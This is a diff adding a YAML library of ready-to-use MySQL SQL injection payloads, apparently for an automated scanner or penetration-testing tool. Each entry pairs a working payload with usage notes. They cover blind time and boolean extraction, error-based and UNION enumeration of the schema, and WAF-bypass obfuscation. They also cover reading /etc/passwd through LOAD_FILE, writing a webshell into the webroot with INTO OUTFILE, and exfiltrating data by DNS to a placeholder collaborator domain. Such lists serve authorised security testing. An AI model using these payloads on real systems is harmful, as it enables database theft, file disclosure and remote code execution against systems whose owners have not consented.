@@ -1,0 +1,612 @@
+defaults:
+  vuln_type: sqli
+  db_engine: mysql
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # BLIND TIME-BASED
+  # ============================================================
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND SLEEP(SLEEP_SECONDS)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Basic MySQL time-based blind. Observe response delay matching SLEEP_SECONDS."
+    tags: [sleep, confirmation]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: timing
+    risk: 2
+    payload: "1 AND SLEEP(SLEEP_SECONDS)"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Numeric context time-based blind. Use when source shows integer interpolation without quoting."
+    tags: [sleep, numeric]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND IF(1=1,SLEEP(SLEEP_SECONDS),0)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Conditional time delay using IF(). Swap 1=1 for data-extracting subquery once confirmed."
+    tags: [sleep, conditional, extraction]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' AND IF((SELECT LENGTH(user()))>0,SLEEP(SLEEP_SECONDS),0)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Extract current user length via conditional sleep. Binary search THRESHOLD to narrow value."
+    tags: [sleep, extraction, user]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND BENCHMARK(5000000,SHA1('test'))--"
+    placeholders: []
+    notes: "BENCHMARK-based time delay. CPU-bound so delay varies by hardware. Use when SLEEP is blocked."
+    tags: [benchmark, confirmation]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: timing
+    risk: 2
+    payload: "\" AND SLEEP(SLEEP_SECONDS)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Double-quote context time-based blind. Use when source shows double-quote string interpolation."
+    tags: [sleep, double_quote]
+
+  - technique: blind_time
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND SLEEP(SLEEP_SECONDS)-- "
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via JSON body field. Ensure payload is inside a JSON string value."
+    tags: [sleep, json]
+
+  - technique: blind_time
+    injection_surface: header
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND SLEEP(SLEEP_SECONDS)-- "
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via HTTP header (X-Forwarded-For, Referer, User-Agent). Use when source logs/queries header values."
+    tags: [sleep, header]
+
+  - technique: blind_time
+    injection_surface: cookie
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND SLEEP(SLEEP_SECONDS)-- "
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via cookie value. Use when source reads session/preference cookies into SQL."
+    tags: [sleep, cookie]
+
+  - technique: blind_time
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND SLEEP(SLEEP_SECONDS)-- "
+    placeholders: [SLEEP_SECONDS]
+    notes: "Time-based blind via form POST body parameter."
+    tags: [sleep, form]
+
+  # ============================================================
+  # BLIND BOOLEAN-BASED
+  # ============================================================
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=1-- "
+    notes: "Boolean true condition. Compare response body/length to false condition (AND 1=2) to confirm oracle."
+    tags: [confirmation, baseline]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=2-- "
+    notes: "Boolean false condition. Pair with true condition. Look for content length diff, missing rows, or error page."
+    tags: [confirmation, baseline]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT ASCII(SUBSTR(user(),CHAR_POS,1)))>THRESHOLD-- "
+    placeholders: [CHAR_POS, THRESHOLD]
+    notes: "Extract current user char-by-char via binary search on ASCII value. Start THRESHOLD=64, bisect."
+    tags: [extraction, user, binary_search]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "1 AND 1=1"
+    notes: "Numeric boolean true. No quotes needed. Use when source interpolates raw integer."
+    tags: [confirmation, numeric]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND/*!*/1=1-- "
+    notes: "Inline comment between AND and condition. Bypasses WAFs splitting on 'AND 1'."
+    tags: [confirmation, obfuscation, inline_comment]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "\" AND 1=1-- "
+    notes: "Double-quote boolean true. Use when source wraps value in double quotes."
+    tags: [confirmation, double_quote]
+
+  - technique: blind_boolean
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=1-- "
+    notes: "Boolean true via JSON body. Look for response body diff vs AND 1=2 variant."
+    tags: [confirmation, json]
+
+  # ============================================================
+  # ERROR-BASED
+  # ============================================================
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+    notes: "EXTRACTVALUE error-based extraction. Look for version string prefixed by ~ in XPATH error."
+    tags: [extractvalue, version]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--"
+    notes: "UPDATEXML error-based extraction. Alternative to EXTRACTVALUE; same XPATH error leak."
+    tags: [updatexml, version]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--"
+    notes: "Extract current DB user via EXTRACTVALUE error. Look for user@host in error text."
+    tags: [extractvalue, user]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))--"
+    notes: "Enumerate first table in current database. Increment LIMIT offset for subsequent tables."
+    tags: [extractvalue, enumeration, information_schema]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME' LIMIT 1)))--"
+    placeholders: [TABLE_NAME]
+    notes: "Enumerate columns of a target table. Increment LIMIT offset for each column."
+    tags: [extractvalue, enumeration, columns]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    notes: "Classic duplicate-entry error extraction via FLOOR(RAND(0)*2). Works on MySQL 5.x. Look for 'Duplicate entry' in error."
+    tags: [floor_rand, version]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: error
+    risk: 2
+    payload: "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))"
+    notes: "Numeric context error-based version leak. No quote needed."
+    tags: [extractvalue, version, numeric]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: error
+    risk: 2
+    payload: "\" AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+    notes: "Double-quote error-based version extraction."
+    tags: [extractvalue, version, double_quote]
+
+  - technique: error_based
+    injection_surface: header
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- "
+    notes: "Error-based extraction via header injection. Use when source logs headers into queries."
+    tags: [extractvalue, version, header]
+
+  - technique: error_based
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- "
+    notes: "Error-based extraction via form POST body parameter."
+    tags: [extractvalue, version, form]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND ST_GeomFromText(CONCAT('POINT(',version(),' 0)'))--"
+    notes: "Geometric function error-based extraction. ST_GeomFromText chokes on non-numeric version string and leaks it. MySQL 5.7+."
+    tags: [geometry, version, bypass]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND ST_GeomFromText(CONCAT('POINT(',(SELECT user()),' 0)'))--"
+    notes: "Geometric function to leak current user. Use when EXTRACTVALUE/UPDATEXML are blocked by WAF."
+    tags: [geometry, user, bypass]
+
+  # ============================================================
+  # UNION-BASED
+  # ============================================================
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' UNION SELECT NULL-- "
+    notes: "Column count probe. Add NULLs one at a time until no error. Start with 1, go up."
+    tags: [column_count, probe]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' UNION SELECT NULL,NULL,NULL-- "
+    notes: "3-column UNION probe. Common column count for id/name/value patterns."
+    tags: [column_count, probe]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT version(),NULL,NULL-- "
+    notes: "Extract MySQL version via UNION. Look for version string rendered in page output."
+    tags: [version, extraction]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT user(),NULL,NULL-- "
+    notes: "Extract current user via UNION. Look for user@host in rendered output."
+    tags: [user, extraction]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- "
+    notes: "Enumerate tables in current database via UNION. One row per table."
+    tags: [enumeration, information_schema]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- "
+    placeholders: [TABLE_NAME]
+    notes: "Enumerate columns and types of target table."
+    tags: [enumeration, information_schema, columns]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- "
+    notes: "All table names in one row using GROUP_CONCAT. Faster than row-by-row but truncates at group_concat_max_len (default 1024)."
+    tags: [enumeration, group_concat]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT GROUP_CONCAT(routine_name,0x3a,routine_type),NULL,NULL FROM information_schema.routines WHERE routine_schema=database()-- "
+    notes: "Enumerate stored procedures and functions in current database. Look for sensitive business logic routines."
+    tags: [enumeration, routines, information_schema]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT GROUP_CONCAT(trigger_name,0x3a,event_object_table),NULL,NULL FROM information_schema.triggers WHERE trigger_schema=database()-- "
+    notes: "Enumerate triggers in current database. Triggers may reveal audit or cascade logic."
+    tags: [enumeration, triggers, information_schema]
+
+  # ============================================================
+  # ORDER BY INJECTION
+  # ============================================================
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "1 ORDER BY 1"
+    notes: "ORDER BY column-count probe. Increment number until error to find column count. Use when injection point is in ORDER BY or appended to query."
+    tags: [order_by, column_count, probe]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: timing
+    risk: 2
+    payload: "1,(SELECT SLEEP(SLEEP_SECONDS))"
+    placeholders: [SLEEP_SECONDS]
+    notes: "ORDER BY context time-based injection via subquery. Use when source injects into ORDER BY clause."
+    tags: [order_by, sleep, subquery]
+
+  # ============================================================
+  # SUBQUERY IN INSERT / UPDATE CONTEXT
+  # ============================================================
+  - technique: error_based
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()))) OR '"
+    notes: "INSERT/UPDATE context injection. Double OR keeps SQL syntax valid by closing original quotes. Use when source builds INSERT VALUES(...) or SET col='...'."
+    tags: [extractvalue, insert_update, user]
+
+  - technique: blind_time
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' OR SLEEP(SLEEP_SECONDS) OR '"
+    placeholders: [SLEEP_SECONDS]
+    notes: "INSERT/UPDATE context time-based blind. Double OR pattern keeps syntax valid in VALUES() or SET clauses."
+    tags: [sleep, insert_update]
+
+  # ============================================================
+  # FILE READ / WRITE (HIGH RISK)
+  # ============================================================
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- "
+    notes: "Read server file via LOAD_FILE(). Requires FILE privilege. Check source for secure_file_priv setting. Look for file content in response."
+    tags: [file_read, load_file, privilege_escalation]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 4
+    payload: "' UNION SELECT LOAD_FILE(0x2F6574632F706173737764),NULL,NULL-- "
+    notes: "LOAD_FILE with hex-encoded path (/etc/passwd). Bypasses WAFs filtering on path strings."
+    tags: [file_read, load_file, hex_obfuscation]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 5
+    payload: "' UNION SELECT 'PAYLOAD_CONTENT',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- "
+    placeholders: [PAYLOAD_CONTENT]
+    notes: "Write file to webroot via INTO OUTFILE. Requires FILE privilege and writable directory outside secure_file_priv. Confirm webroot path from source code first."
+    tags: [file_write, outfile, rce]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 5
+    payload: "' UNION SELECT 'PAYLOAD_CONTENT' INTO DUMPFILE '/var/www/html/shell.php'-- "
+    placeholders: [PAYLOAD_CONTENT]
+    notes: "INTO DUMPFILE writes raw bytes without row/field terminators. Preferred for binary payloads or single-line webshells."
+    tags: [file_write, dumpfile, rce]
+
+  # ============================================================
+  # HEX ENCODING / OBFUSCATION
+  # ============================================================
+  - technique: error_based
+    injection_surface: query
+    encoding: hex
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT HEX(user()))))--"
+    notes: "HEX-encoded output avoids truncation on special chars. Decode hex result client-side to recover value."
+    tags: [extractvalue, hex_obfuscation, user]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT HEX(GROUP_CONCAT(table_name)),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- "
+    notes: "HEX-wrapped GROUP_CONCAT avoids issues with special characters or truncation artifacts. Decode hex to get table names."
+    tags: [enumeration, hex_obfuscation, group_concat]
+
+  # ============================================================
+  # VERSION-CONDITIONAL COMMENT OBFUSCATION
+  # ============================================================
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' /*!50000AND*/ SLEEP(SLEEP_SECONDS)--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "MySQL version-conditional comment. Content executes only on MySQL >=5.0. Bypasses WAFs that strip standard comments."
+    tags: [sleep, obfuscation, version_comment]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' /*!50000AND*/ EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+    notes: "Version-conditional comment bypass for error-based extraction. Effective against regex-based WAF rules."
+    tags: [extractvalue, obfuscation, version_comment]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' /*!50000UNION*/ /*!50000SELECT*/ version(),NULL,NULL--"
+    notes: "Version-conditional comments wrapping UNION SELECT keywords individually. Breaks WAF keyword matching."
+    tags: [version, obfuscation, version_comment]
+
+  # ============================================================
+  # URL-ENCODED VARIANTS
+  # ============================================================
+  - technique: blind_time
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "%27%20AND%20SLEEP(SLEEP_SECONDS)--%20"
+    placeholders: [SLEEP_SECONDS]
+    notes: "URL-encoded time-based blind. Use when injecting into query string parameters."
+    tags: [sleep, url_encoded]
+
+  - technique: error_based
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,version()))--%20"
+    notes: "URL-encoded error-based version extraction."
+    tags: [extractvalue, version, url_encoded]
+
+  - technique: union
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "%27%20UNION%20SELECT%20NULL--%20"
+    notes: "URL-encoded UNION column count probe."
+    tags: [column_count, probe, url_encoded]
+
+  # ============================================================
+  # STACKED QUERIES / MULTI-STATEMENT
+  # ============================================================
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "'; SELECT SLEEP(SLEEP_SECONDS)-- "
+    placeholders: [SLEEP_SECONDS]
+    notes: "Stacked query time-based. Only works with multi-statement support (mysqli_multi_query, PDO with ATTR_EMULATE_PREPARES). Confirm from source."
+    tags: [stacked, sleep]
+
+  # ============================================================
+  # JSON_EXTRACT (MySQL 5.7+)
+  # ============================================================
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND JSON_EXTRACT(version(),CONCAT('$.',user()))--"
+    notes: "JSON_EXTRACT error-based leak for MySQL 5.7+. Invalid JSON path leaks both version and user in error. Use when XML functions are blocked."
+    tags: [json_extract, version, bypass]
+
+  - technique: blind_boolean
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND JSON_LENGTH(JSON_ARRAY((SELECT user())))>0-- "
+    notes: "Boolean check using JSON_LENGTH on subquery result. Returns true if subquery produces output. MySQL 5.7+ only."
+    tags: [json_extract, boolean, json]
+
+  # ============================================================
+  # DNS / OOB EXFILTRATION
+  # ============================================================
+  - technique: dns
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 4
+    payload: "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.COLLABORATOR_DOMAIN\\\\a'))--"
+    placeholders: [COLLABORATOR_DOMAIN]
+    notes: "OOB data exfil via LOAD_FILE UNC path. Windows MySQL only. version() result becomes DNS subdomain label. Monitor COLLABORATOR_DOMAIN for hit."
+    tags: [oob, dns, load_file, windows]
+
+  - technique: dns
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 4
+    payload: "' AND LOAD_FILE(CONCAT('\\\\\\\\',HEX(user()),'.COLLABORATOR_DOMAIN\\\\a'))--"
+    placeholders: [COLLABORATOR_DOMAIN]
+    notes: "OOB user exfil via UNC path with HEX encoding. HEX avoids illegal DNS characters like @. Windows only."
+    tags: [oob, dns, load_file, hex_obfuscation, windows]
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: oob
+    risk: 4
+    payload: "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',HEX((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)),'.COLLABORATOR_DOMAIN\\\\a')))--"
+    placeholders: [COLLABORATOR_DOMAIN]
+    notes: "OOB table enumeration via DNS. Exfiltrate table names one at a time through UNC path. Windows only. Increment LIMIT offset."
+    tags: [oob, dns, enumeration, windows]
